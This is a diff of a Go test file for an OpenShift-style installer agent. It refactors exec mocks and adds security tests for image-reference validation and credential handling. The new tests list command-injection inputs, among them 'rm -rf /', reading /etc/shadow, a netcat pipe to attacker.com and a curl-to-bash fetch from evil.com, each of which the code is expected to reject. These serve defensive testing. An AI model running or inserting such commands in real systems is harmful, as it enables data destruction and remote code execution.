@@ -105,7 +105,7 @@ var _ = Describe("Upload logs", func() {
 		conf = &config.Config{CACertPath: "test.ca"}
 		m := MatcherContainsStringElements{[]string{"test.ca:test.ca", "-cacert=test.ca"}, true}
 		o := NewOpsWithConfig(conf, l, execMock)
-		execMock.EXPECT().ExecCommand(gomock.Any(), gomock.Any(), m).Times(1)
+		execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "podman", m, gomock.Any(), gomock.Any()).Times(1)
 		_, err := o.UploadInstallationLogs(true)
 		Expect(err).ToNot(HaveOccurred())
 	})
@@ -113,7 +113,7 @@ var _ = Describe("Upload logs", func() {
 	It("Upload logs without ca path", func() {
 		m := MatcherContainsStringElements{[]string{"test.ca:test.ca", "-cacert=test.ca"}, false}
 		o := NewOpsWithConfig(conf, l, execMock)
-		execMock.EXPECT().ExecCommand(gomock.Any(), gomock.Any(), m).Times(1)
+		execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "podman", m, gomock.Any(), gomock.Any()).Times(1)
 		_, err := o.UploadInstallationLogs(true)
 		Expect(err).ToNot(HaveOccurred())
 	})
@@ -137,9 +137,9 @@ var _ = Describe("Set Boot Order", func() {
 		efiDirname := d
 		It(fmt.Sprintf("Set boot order for %s", efiDirname), func() {
 			m1 := MatcherContainsStringElements{[]string{"/usr/sbin/bootlist"}, true}
-			execMock.EXPECT().ExecCommand(gomock.Any(), gomock.Any(), m1).Times(1).Return("", errors.New("Bootlist is not exist."))
-			m2 := MatcherContainsStringElements{[]string{"test", "-d", "/sys/firmware/efi"}, true}
-			execMock.EXPECT().ExecCommand(gomock.Any(), gomock.Any(), m2).Times(1)
+			execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "test", m1, gomock.Any()).Times(1).Return("", errors.New("Bootlist is not exist."))
+			m2 := MatcherContainsStringElements{[]string{"-d", "/sys/firmware/efi"}, true}
+			execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "test", m2, gomock.Any()).Times(1)
 			// Mock the lsblk call for getPartitionPathFromLsblk in findEfiDirectory
 			lsblkOutput := `{
 				"blockdevices": [
@@ -156,18 +156,18 @@ var _ = Describe("Set Boot Order", func() {
 					}
 				]
 			}`
-			mLsblk := MatcherContainsStringElements{[]string{"lsblk", "--bytes", "--json", "/dev/sda"}, true}
-			execMock.EXPECT().ExecCommand(gomock.Any(), gomock.Any(), mLsblk).Times(1).Return(lsblkOutput, nil)
-			m3 := MatcherContainsStringElements{[]string{"efibootmgr", "/dev/sda", "Red Hat Enterprise Linux"}, true}
-			execMock.EXPECT().ExecCommand(gomock.Any(), gomock.Any(), m3).Times(1).Return("", nil)
-			m4 := MatcherContainsStringElements{[]string{"efibootmgr", "-l"}, true}
-			execMock.EXPECT().ExecCommand(gomock.Any(), gomock.Any(), m4).Times(1)
-			m5 := MatcherContainsStringElements{[]string{"mount", "/dev/sda2", "/mnt"}, true}
-			execMock.EXPECT().ExecCommand(gomock.Any(), gomock.Any(), m5).Times(1).Return("", nil)
-			m6 := MatcherContainsStringElements{[]string{"ls", "-1", "/mnt/EFI"}, true}
-			execMock.EXPECT().ExecCommand(gomock.Any(), gomock.Any(), m6).Times(1).Return(fmt.Sprintf("BOOT\n%s\n", efiDirname), nil)
-			m7 := MatcherContainsStringElements{[]string{"umount", "/mnt"}, true}
-			execMock.EXPECT().ExecCommand(gomock.Any(), gomock.Any(), m7).Times(1).Return("", nil)
+			mLsblk := MatcherContainsStringElements{[]string{"--bytes", "--json", "/dev/sda"}, true}
+			execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "lsblk", mLsblk, gomock.Any()).Times(1).Return(lsblkOutput, nil)
+			m3 := MatcherContainsStringElements{[]string{"/dev/sda", "Red Hat Enterprise Linux"}, true}
+			execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "efibootmgr", m3, gomock.Any()).Times(1).Return("", nil)
+			m4 := MatcherContainsStringElements{[]string{"-l"}, true}
+			execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "efibootmgr", m4, gomock.Any()).Times(1)
+			m5 := MatcherContainsStringElements{[]string{"/dev/sda2", "/mnt"}, true}
+			execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "mount", m5, gomock.Any()).Times(1).Return("", nil)
+			m6 := MatcherContainsStringElements{[]string{"-1", "/mnt/EFI"}, true}
+			execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "ls", m6, gomock.Any()).Times(1).Return(fmt.Sprintf("BOOT\n%s\n", efiDirname), nil)
+			m7 := MatcherContainsStringElements{[]string{"/mnt"}, true}
+			execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "umount", m7, gomock.Any()).Times(1).Return("", nil)
 			o := NewOpsWithConfig(conf, l, execMock)
 			err := o.SetBootOrder("/dev/sda")
 			Expect(err).ToNot(HaveOccurred())
@@ -176,9 +176,9 @@ var _ = Describe("Set Boot Order", func() {
 
 	It("Set boot order for ppc64le", func() {
 		m1 := MatcherContainsStringElements{[]string{"/usr/sbin/bootlist"}, true}
-		execMock.EXPECT().ExecCommand(gomock.Any(), gomock.Any(), m1).Times(1)
-		m2 := MatcherContainsStringElements{[]string{"bootlist", "/dev/sda"}, true}
-		execMock.EXPECT().ExecCommand(gomock.Any(), gomock.Any(), m2).Times(1)
+		execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "test", m1, gomock.Any()).Times(1)
+		m2 := MatcherContainsStringElements{[]string{"/dev/sda"}, true}
+		execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "bootlist", m2, gomock.Any()).Times(1)
 		o := NewOpsWithConfig(conf, l, execMock)
 		err := o.SetBootOrder("/dev/sda")
 		Expect(err).ToNot(HaveOccurred())
@@ -460,16 +460,8 @@ var _ = Describe("overwrite OS image", func() {
 		o = NewOpsWithConfig(conf, l, execMock)
 	})
 
-	mockPrivileged := func(args ...interface{}) {
-		execMock.EXPECT().ExecCommand(nil, "nsenter",
-			append(append([]interface{}{},
-				"--target",
-				"1",
-				"--cgroup",
-				"--mount",
-				"--ipc",
-				"--pid",
-				"--"), args...)...).Times(1)
+	mockPrivileged := func(command string, args ...string) {
+		execMock.EXPECT().ExecCommandWithOptions(nil, command, args, gomock.Any()).Times(1)
 	}
 	// Helper function to generate correct partition names for all device types
 	getPartitionName := func(deviceName, partNum string) string {
@@ -504,33 +496,13 @@ var _ = Describe("overwrite OS image", func() {
 	}
 	runTest := func(device, part3, part4 string) {
 		// Mock lsblk calls for partition path discovery (called twice - once for partition 4, once for partition 3)
-		execMock.EXPECT().ExecCommand(nil, "nsenter",
-			append([]interface{}{},
-				"--target",
-				"1",
-				"--cgroup",
-				"--mount",
-				"--ipc",
-				"--pid",
-				"--",
-				"lsblk",
-				"--bytes",
-				"--json",
-				device)...).Return(formatResult(device), nil).Times(2)
+		execMock.EXPECT().ExecCommandWithOptions(nil, "lsblk",
+			[]string{"--bytes", "--json", device},
+			gomock.Any()).Return(formatResult(device), nil).Times(2)
 		// Mock lsblk call for calculateFreePercent function
-		execMock.EXPECT().ExecCommand(nil, "nsenter",
-			append([]interface{}{},
-				"--target",
-				"1",
-				"--cgroup",
-				"--mount",
-				"--ipc",
-				"--pid",
-				"--",
-				"lsblk",
-				"--bytes",
-				"--json",
-				device)...).Return(formatResult(device), nil)
+		execMock.EXPECT().ExecCommandWithOptions(nil, "lsblk",
+			[]string{"--bytes", "--json", device},
+			gomock.Any()).Return(formatResult(device), nil)
 		osImage := "quay.io/release-image:latest"
 		extraArgs := []string{
 			"--karg",
@@ -602,16 +574,19 @@ var _ = Describe("get number of reboots", func() {
 		o = NewOpsWithConfig(conf, l, execMock)
 	})
 	expect := func(ret string, err error) {
-		execMock.EXPECT().ExecCommandWithContext(gomock.Any(), gomock.Any(), "oc",
-			"--kubeconfig",
-			kubeconfigPath,
-			"debug",
-			fmt.Sprintf("node/%s", nodeName),
-			"--",
-			"chroot",
-			"/host",
-			"last",
-			"reboot").Return(ret, err)
+		execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "oc",
+			[]string{
+				"--kubeconfig",
+				kubeconfigPath,
+				"debug",
+				fmt.Sprintf("node/%s", nodeName),
+				"--",
+				"chroot",
+				"/host",
+				"last",
+				"reboot",
+			},
+			gomock.Any()).Return(ret, err)
 	}
 	It("1 reboot", func() {
 		expect("reboot   system boot  4.18.0-372.9.1.e Tue Mar  7 04:13   still running\n", nil)
@@ -644,11 +619,9 @@ var _ = Describe("WriteImageToExistingRoot", func() {
 		o        *ops
 	)
 
-	expectExec := func(out string, err error, additionalArgs ...any) {
-		baseArgs := []any{"--target", "1", "--cgroup", "--mount", "--ipc", "--pid", "--"}
-		args := append(baseArgs, additionalArgs...)
-		execMock.EXPECT().ExecCommand(gomock.Any(),
-			"nsenter", args...).Return(out, err)
+	expectExec := func(out string, err error, command string, args ...string) {
+		execMock.EXPECT().ExecCommandWithOptions(gomock.Any(),
+			command, args, gomock.Any()).Return(out, err)
 	}
 
 	BeforeEach(func() {
@@ -798,9 +771,8 @@ var _ = Describe("getPartitionPathFromLsblk", func() {
 	})
 
 	mockLsblkCommand := func(device, output string, err error) {
-		execMock.EXPECT().ExecCommand(nil, "nsenter",
-			"--target", "1", "--cgroup", "--mount", "--ipc", "--pid", "--",
-			"lsblk", "--bytes", "--json", device).Return(output, err)
+		execMock.EXPECT().ExecCommandWithOptions(nil, "lsblk",
+			[]string{"--bytes", "--json", device}, gomock.Any()).Return(output, err)
 	}
 
 	Context("Standard SATA devices", func() {
@@ -1194,16 +1166,8 @@ var _ = Describe("Copy registry data", func() {
 		o = NewOpsWithConfig(conf, l, execMock)
 	})
 
-	mockPrivileged := func(args ...interface{}) {
-		execMock.EXPECT().ExecCommand(nil, "nsenter",
-			append(append([]interface{}{},
-				"--target",
-				"1",
-				"--cgroup",
-				"--mount",
-				"--ipc",
-				"--pid",
-				"--"), args...)...).Times(1)
+	mockPrivileged := func(command string, args ...string) {
+		execMock.EXPECT().ExecCommandWithOptions(nil, command, args, gomock.Any()).Times(1)
 	}
 	// Helper function to generate correct partition names for all device types
 	getPartitionName := func(deviceName, partNum string) string {
@@ -1242,32 +1206,13 @@ var _ = Describe("Copy registry data", func() {
 		registryDataDirOnRoot := filepath.Join("/mnt/root/ostree/deploy/rhcos", registryDataDirOnDevice)
 
 		// Mock du calls for getting registry data size
-		execMock.EXPECT().ExecCommand(nil, "nsenter",
-			append([]interface{}{},
-				"--target",
-				"1",
-				"--cgroup",
-				"--mount",
-				"--ipc",
-				"--pid",
-				"--",
-				"du",
-				"-sb",
-				dataDir)...).Return(strconv.FormatInt(int64(registryDataSize), 10), nil).Times(1)
+		execMock.EXPECT().ExecCommandWithOptions(nil, "du",
+			[]string{"-sb", dataDir},
+			gomock.Any()).Return(strconv.FormatInt(int64(registryDataSize), 10), nil).Times(1)
 		// Mock lsblk calls for partition path discovery / calculateFreePercent function
-		execMock.EXPECT().ExecCommand(nil, "nsenter",
-			append([]interface{}{},
-				"--target",
-				"1",
-				"--cgroup",
-				"--mount",
-				"--ipc",
-				"--pid",
-				"--",
-				"lsblk",
-				"--bytes",
-				"--json",
-				device)...).Return(formatResult(device), nil).Times(2)
+		execMock.EXPECT().ExecCommandWithOptions(nil, "lsblk",
+			[]string{"--bytes", "--json", device},
+			gomock.Any()).Return(formatResult(device), nil).Times(2)
 
 		mockPrivileged("mkdir", "-p", "/mnt/root")
 		mockPrivileged("mount", part4, "/mnt/root")
@@ -1284,18 +1229,9 @@ var _ = Describe("Copy registry data", func() {
 		mockPrivileged("mkdir", "-p", registryDataDirOnRoot)
 
 		// Mock rsync call
-		execMock.EXPECT().ExecCommand(io.Discard, "nsenter",
-			append([]interface{}{},
-				"--target",
-				"1",
-				"--cgroup",
-				"--mount",
-				"--ipc",
-				"--pid",
-				"--",
-				"sh",
-				"-c",
-				fmt.Sprintf("rsync -ah --info=progress2 %s/ %s/", dataDir, registryDataDirOnRoot))...).Return("", nil).Times(1)
+		execMock.EXPECT().ExecCommandWithOptions(io.Discard, "sh",
+			[]string{"-c", fmt.Sprintf("rsync -ah --info=progress2 %s/ %s/", dataDir, registryDataDirOnRoot)},
+			gomock.Any()).Return("", nil).Times(1)
 
 		mockPrivileged("fsfreeze", "--freeze", "/mnt/root")
 		mockPrivileged("umount", "/mnt/root")
@@ -1314,5 +1250,202 @@ var _ = Describe("Copy registry data", func() {
 	})
 	It("Copy registry data - device mapper", func() {
 		runTest("/dev/dm-0", "/dev/dm-4")
+	})
+})
+
+var _ = Describe("Security: validateImageReference", func() {
+	It("should accept valid image references", func() {
+		validImages := []string{
+			"quay.io/openshift/must-gather:latest",
+			"registry.redhat.io/ocs4/ocs-must-gather-rhel8:v4.8",
+			"localhost:5000/my-image:tag",
+			"registry.redhat.io:443/ocs4/image:v4.8",
+			"my-registry.com:8080/repo/image:latest",
+			"my-registry.com/repo/image@sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
+			"registry.access.redhat.com/ubi9/ubi:latest@sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
+			"simple-image",
+			"namespace/image",
+		}
+
+		for _, img := range validImages {
+			err := validateImageReference(img)
+			Expect(err).ToNot(HaveOccurred(), fmt.Sprintf("Valid image '%s' should be accepted", img))
+		}
+	})
+
+	It("should reject image references with shell metacharacters", func() {
+		injectionAttempts := []string{
+			"image; rm -rf /",
+			"image | cat /etc/passwd",
+			"image && malicious",
+			"image || echo pwned",
+			"$(malicious-command)",
+			"`whoami`",
+			"image<script>",
+			"image>output",
+			"image'DROP TABLE",
+			"image\"injection",
+			"image\\escape",
+			"image!bang",
+			"image{brace}",
+			"image[array]",
+			"image(paren)",
+			"image&background",
+			"image$variable",
+		}
+
+		for _, img := range injectionAttempts {
+			err := validateImageReference(img)
+			Expect(err).To(HaveOccurred(), fmt.Sprintf("Malicious image '%s' should be rejected", img))
+			Expect(err.Error()).To(ContainSubstring("invalid"))
+		}
+	})
+
+	It("should reject image references with control characters", func() {
+		invalidImages := []string{
+			"image\nwith\nnewline",
+			"image\rwith\rcarriage",
+			"image\twith\ttab",
+			"image\x00null",
+		}
+
+		for _, img := range invalidImages {
+			err := validateImageReference(img)
+			Expect(err).To(HaveOccurred(), fmt.Sprintf("Image with control chars '%v' should be rejected", []byte(img)))
+		}
+	})
+
+	It("should reject empty image reference", func() {
+		err := validateImageReference("")
+		Expect(err).To(HaveOccurred())
+		Expect(err.Error()).To(ContainSubstring("cannot be empty"))
+	})
+})
+
+var _ = Describe("Security: GetMustGatherLogs command injection protection", func() {
+	var (
+		ctrl     *gomock.Controller
+		mockExec *execute.MockExecute
+		o        Ops
+		tempDir  string
+	)
+
+	BeforeEach(func() {
+		ctrl = gomock.NewController(GinkgoT())
+		mockExec = execute.NewMockExecute(ctrl)
+		o = NewOps(logrus.New(), mockExec)
+
+		var err error
+		tempDir, err = os.MkdirTemp("", "must-gather-test")
+		Expect(err).ToNot(HaveOccurred())
+	})
+
+	AfterEach(func() {
+		ctrl.Finish()
+		os.RemoveAll(tempDir)
+	})
+
+	It("should reject malicious image names with command injection attempts", func() {
+		maliciousImages := []string{
+			"image; rm -rf /",
+			"image && cat /etc/shadow",
+			"image | nc attacker.com 1234",
+			"$(curl http://evil.com/script.sh | bash)",
+		}
+
+		for _, img := range maliciousImages {
+			_, err := o.GetMustGatherLogs(tempDir, "/tmp/kubeconfig", img)
+			Expect(err).To(HaveOccurred(), fmt.Sprintf("Should reject malicious image: %s", img))
+			Expect(err.Error()).To(ContainSubstring("invalid"))
+		}
+	})
+
+	It("should execute oc with proper arguments for valid images", func() {
+		kubeconfig := "/tmp/kubeconfig"
+		image := "quay.io/openshift/must-gather:latest"
+
+		mustGatherDir := filepath.Join(tempDir, "must-gather.local.123456")
+		Expect(os.Mkdir(mustGatherDir, 0755)).To(Succeed())
+
+		mockExec.EXPECT().ExecCommandWithOptions(
+			gomock.Any(),
+			"oc",
+			[]string{"--kubeconfig=" + kubeconfig, "adm", "must-gather", "--image=" + image},
+			gomock.Any(),
+		).Return("output", nil)
+
+		mockExec.EXPECT().ExecCommand(
+			gomock.Any(),
+			"tar",
+			"-czf",
+			filepath.Join(tempDir, MustGatherFileName),
+			"-C",
+			tempDir,
+			"must-gather.local.123456",
+		).Return("", nil)
+
+		_, err := o.GetMustGatherLogs(tempDir, kubeconfig, image)
+		Expect(err).ToNot(HaveOccurred())
+	})
+})
+
+var _ = Describe("Security: UploadInstallationLogs credential protection", func() {
+	var (
+		ctrl       *gomock.Controller
+		mockExec   *execute.MockExecute
+		o          *ops
+		testConfig *config.Config
+	)
+
+	BeforeEach(func() {
+		ctrl = gomock.NewController(GinkgoT())
+		mockExec = execute.NewMockExecute(ctrl)
+
+		testConfig = &config.Config{
+			ClusterID:            "test-cluster",
+			URL:                  "http://test.com",
+			PullSecretToken:      "super-secret-bearer-token-12345",
+			HostID:               "test-host",
+			InfraEnvID:           "test-infraenv",
+			AgentImage:           "quay.io/test/agent:latest",
+			SkipCertVerification: false,
+		}
+
+		o = NewOpsWithConfig(testConfig, logrus.New(), mockExec).(*ops)
+	})
+
+	AfterEach(func() {
+		ctrl.Finish()
+	})
+
+	It("should pass pull-secret-token via per-command environment, not CLI argument", func() {
+		mockExec.EXPECT().ExecCommandWithOptions(
+			gomock.Any(),
+			"podman",
+			gomock.Any(),
+			gomock.Any(),
+			gomock.Any(),
+		).DoAndReturn(func(writer io.Writer, command string, args []string, opts ...execute.CommandOption) (string, error) {
+			argsString := strings.Join(args, " ")
+			Expect(command).To(Equal("podman"))
+			Expect(argsString).ToNot(ContainSubstring(testConfig.PullSecretToken),
+				"Token value should not appear in command arguments")
+
+			Expect(argsString).To(ContainSubstring("--env PULL_SECRET_TOKEN"),
+				"Should use --env flag with variable name only")
+
+			Expect(argsString).ToNot(MatchRegexp(`(?:--env|-e)\s+PULL_SECRET_TOKEN=`),
+				"Should not use --env PULL_SECRET_TOKEN=value format")
+
+			Expect(argsString).ToNot(ContainSubstring("-pull-secret-token"),
+				"Should not use -pull-secret-token CLI argument")
+
+			Expect(opts).To(HaveLen(2), "Should have WithPrivilege and WithEnv options")
+
+			return "", nil
+		})
+
+		_, err := o.UploadInstallationLogs(false)
+		Expect(err).ToNot(HaveOccurred())
 	})
 })
